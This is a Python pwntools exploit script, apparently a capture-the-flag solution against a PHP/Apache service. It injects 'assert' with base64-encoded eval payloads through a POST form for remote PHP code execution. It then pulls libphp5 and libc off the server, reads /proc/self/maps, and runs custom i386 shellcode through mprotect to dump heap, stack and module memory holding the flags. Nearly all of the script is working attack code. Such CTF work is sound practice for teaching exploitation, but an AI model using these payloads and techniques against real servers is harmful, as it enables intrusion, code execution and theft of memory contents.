import urllib
from pwn import *
context(arch = "i386", os = "linux")

HOST = 'localhost'
PORT = 31178
if len(sys.argv) > 1:
    HOST = sys.argv[1]
if len(sys.argv) > 2:
    PORT = int(sys.argv[2])

def resolve_addresses():
    global REL_CAL_CONVERSION_TABLE
    global REL_PHP_OUTPUT_WRITE_UNBUFFERED
    global REL_MPROTECT
    if not os.path.exists("data/libphp5.so"):
        cmd = "print(file_get_contents('/usr/lib/apache2/modules/libphp5.so'));"
        with open("data/libphp5.so", "w") as f:
            f.write(execute_php(cmd).recvall()[:-7])
    if not os.path.exists("data/libc-2.19.so"):
        cmd = "print(file_get_contents('/lib/i386-linux-gnu/libc-2.19.so'));"
        with open("data/libc-2.19.so", "w") as f:
            f.write(execute_php(cmd).recvall()[:-7])

    php5 = ELF("data/libphp5.so")
    libc = ELF("data/libc-2.19.so")
    REL_CAL_CONVERSION_TABLE = list(php5.search(p32(list(php5.search("CAL_GREGORIAN\0"))[0])))[0]-4
    REL_PHP_OUTPUT_WRITE_UNBUFFERED = php5.symbols["php_output_write_unbuffered"]
    REL_MPROTECT = libc.symbols["mprotect"]

def connect():
    return remote(HOST, PORT)

def read_chunk(conn):
    line = conn.recvline()
    length = unhex(line)
    return conn.recvn(line)

def execute_php(script):
    if script[:5] == "<?php":
        script = script[5:]
    script = 'ob_end_flush();echo str_repeat("@", 15)."\n";' + "\n" + script

    form = {
        "name": "A"*32 + "assert",
        "text": "@exit(@eval(@base64_decode('" + script.encode("base64") + "')))",
    }
    post_data = urllib.urlencode(form)
    
    conn = connect()
    conn.send("POST / HTTP/1.1\r\n")
    conn.send("Host: localhost\r\n")
    conn.send("Content-Type: application/x-www-form-urlencoded\r\n")
    conn.send("Content-Length: %d\r\n" % len(post_data))
    conn.send("\r\n")
    conn.send(post_data)
    #header = conn.recvuntil("\r\n\r\n")
    #print header
    #if "chunked" in header:
    #    pass
    conn.recvuntil("@"*15 + "\n")
    return conn

def extract_maps(raw = False):
    marker = "@@@@@@"
    script = 'echo "%s".file_get_contents("/proc/self/maps")."%s";' % (marker, marker)
    conn = execute_php(script)
    conn.recvuntil(marker)
    result_raw = conn.recvuntil(marker, drop=True)
    conn.close()
    
    if raw:
        return result_raw

    result = []
    pat = re.compile('^(\w+)-(\w+) (\S+) \w+ \w+:\w+ \w+\s+(.*)$')
    for line in result_raw.split("\n"):
        m = pat.search(line)
        if m:
            addr_begin = int(m.group(1), 16)
            addr_end = int(m.group(2), 16)
            perms = m.group(3)
            pathname = m.group(4)
            result.append((addr_begin, addr_end, perms, pathname))
    
    return result

def find_base(maps, pathname):
    for e in maps:
        if e[3] == pathname:
            return e[0]
    return None

def find_tail(maps, pathname):
    t = 0
    for e in maps:
        if e[3] == pathname:
            t = e[1]
    return t

def php_string_escape(s):
    t = ""
    for c in s:
        t += "\\" + hex(ord(c))[1:]
    return t

def dump_memory(maps, start_addr, length):
    php5_base = find_base(maps, "/usr/lib/apache2/modules/libphp5.so")
    libc_base = find_base(maps, "/lib/i386-linux-gnu/libc-2.19.so")
    
    cal_conversion_table = php5_base + REL_CAL_CONVERSION_TABLE
    php_output_write_unbuffered = php5_base + REL_PHP_OUTPUT_WRITE_UNBUFFERED
    mprotect = libc_base + REL_MPROTECT

    shellcode_asm = """
_start:
    mov eax, {func_addr}
    push {length}
    push {start_addr}
    call eax
    /* send dummy */
    mov eax, {func_addr}
    push 4096
    push {start_addr}
    call eax
exit:
    mov eax, 1
    int 0x80
""".format(length=length, start_addr=start_addr,
           func_addr=php_output_write_unbuffered)
    shellcode = asm(shellcode_asm)
    if "." in shellcode:
        print "Unlucky shellcode!"
        exit(1)

    script = file("exec-shellcode.php").read()
    vars = {
        "CAL_CONVERSION_TABLE": str(cal_conversion_table),
        "MPROTECT": str(mprotect),
        "ESCAPED_SHELLCODE": php_string_escape(shellcode),
    }
    def replace_var(m):
        return vars[m.group(1)]
    script = re.sub('%%(\w+)%%', replace_var, script)
    
    conn = execute_php(script)
    print conn.recvuntil("Let's fun\n")
    # sync flush
    conn.recvline()
    # assert chunk size
    if int(conn.recvline(), 16) < length:
        print "chunks are collapsed."
        exit(1)
    
    memory = conn.recvn(length)
    conn.close()
    return memory

def dump_heap():
    with file("data/dumped-maps", "w") as f:
        f.write(extract_maps(raw=True))
    
    maps = extract_maps()
    heap_base = find_base(maps, "[heap]")
    heap_tail = find_tail(maps, "[heap]")
    heap_size = heap_tail - heap_base
    stack_base = find_base(maps, "[stack]")
    stack_tail = find_tail(maps, "[stack]")
    stack_size = stack_tail - stack_base
    
    heap = dump_memory(maps, heap_base, heap_size)
    with file("data/dumped-heap", "w") as f:
        f.write(heap)
    stack = dump_memory(maps, stack_base, stack_size)
    with file("data/dumped-stack", "w") as f:
        f.write(stack)
    print "Heap: %08x-%08x" % (heap_base, heap_base + heap_size)
    print "Stack: %08x-%08x" % (stack_base, stack_base + stack_size)
    print "maps is dumped to data/dumped-maps"
    print "heap is dumped to data/dumped-heap"
    print "stack is dumped to data/dumped-stack"

def show_flag1():
    script = "echo file_get_contents('/flag1');"
    conn = execute_php(script)
    print "Flag1: %s" % conn.recvline()[:-1]
    print
    conn.close()

def dump_flag2():
    maps = extract_maps()
    mod_flag_base = find_base(maps, "/usr/lib/apache2/modules/mod_flag.so")
    mod_flag_tail = find_tail(maps, "/usr/lib/apache2/modules/mod_flag.so")
    mod_flag_size = mod_flag_tail - mod_flag_base
    memory = dump_memory(maps, mod_flag_base, mod_flag_size)
    with file("data/dumped-mod_flag", "w") as f:
        f.write(memory)
    print "mod_flag is dumped to data/dumped-mod_flag"

show_flag1()

resolve_addresses()
dump_flag2()
dump_heap()
